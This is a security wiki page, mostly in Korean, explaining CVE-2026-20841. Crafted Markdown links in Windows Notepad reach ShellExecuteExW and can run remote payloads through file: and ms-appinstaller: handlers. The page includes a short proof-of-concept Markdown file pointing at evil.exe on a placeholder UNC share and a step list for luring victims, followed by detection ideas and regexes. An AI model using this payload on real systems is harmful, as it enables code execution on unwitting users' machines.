# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Markdown/HTML을 렌더링하는 최신 Windows 애플리케이션은 사용자 제공 링크를 클릭 가능한 요소로 바꿔 `ShellExecuteExW`로 전달하는 경우가 많습니다. 엄격한 스킴 허용 목록이 없으면 등록된 모든 프로토콜 핸들러(예: `file:`, `ms-appinstaller:`)가 호출되어 현재 사용자 컨텍스트에서 코드 실행으로 이어질 수 있습니다.

## Windows Notepad Markdown 모드에서의 ShellExecuteExW 노출
- Notepad는 `sub_1400ED5D0()`에서 고정 문자열 비교를 통해 **오직 `.md` 확장자에 대해서만** Markdown 모드를 선택합니다.
- 지원되는 Markdown 링크:
- 표준: `[text](target)`
- Autolink: `<target>` (렌더링되어 `[target](target)`가 되므로, 둘 다 페이로드와 탐지에 중요합니다.)
- 링크 클릭은 `sub_140170F60()`에서 처리되며, 이 함수는 약한 필터링을 수행한 다음 `ShellExecuteExW`를 호출합니다.
- `ShellExecuteExW`는 HTTP(S)뿐 아니라 **구성된 모든 프로토콜 핸들러**로 전달합니다.

### 페이로드 고려사항
- 링크의 모든 `\\` 시퀀스는 `ShellExecuteExW` 호출 전에 **`\\`가 `\`로 정규화**되어 UNC/경로 구성 및 탐지에 영향을 미칩니다.
- `.md` 파일은 기본적으로 Notepad에 연관되어 있지 않습니다; 피해자가 여전히 파일을 Notepad에서 열고 링크를 클릭해야 하지만, 렌더링된 후에는 링크가 클릭 가능해집니다.
- 위험한 예시 스킴:
- `file://` — 로컬/UNC 페이로드를 실행하기 위해 사용됩니다.
- `ms-appinstaller://` — App Installer 흐름을 트리거합니다. 로컬에 등록된 다른 스킴도 악용될 수 있습니다.

### Minimal PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### 악용 흐름
1. Notepad가 Markdown으로 렌더링하도록 **`.md` file**을 만듭니다.
2. 위험한 URI 스킴(`file:`, `ms-appinstaller:`, 또는 설치된 핸들러)을 사용하는 링크를 삽입합니다.
3. 파일을 전달(HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB 등)하고 사용자가 Notepad에서 열도록 설득합니다.
4. 클릭 시 **정규화된 링크**가 `ShellExecuteExW`에 전달되고 해당 프로토콜 핸들러가 사용자 컨텍스트에서 참조된 콘텐츠를 실행합니다.

## 탐지 아이디어
- 문서를 전달하는 데 흔히 사용되는 포트/프로토콜을 통해 전송되는 `.md` 파일을 모니터링합니다: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Markdown 링크(standard 및 autolink)를 파싱하고 **대소문자 구분 없이** `file:` 또는 `ms-appinstaller:`를 찾습니다.
- 원격 리소스 접근을 포착하기 위한 벤더 가이드 정규식:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- 패치 동작은 보고에 따르면 **allowlists local files and HTTP(S)**; `ShellExecuteExW`에 도달하는 다른 모든 것은 의심스럽습니다. 시스템마다 공격 표면이 달라 필요에 따라 다른 설치된 프로토콜 핸들러에 대한 탐지를 확장하세요.

## References
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
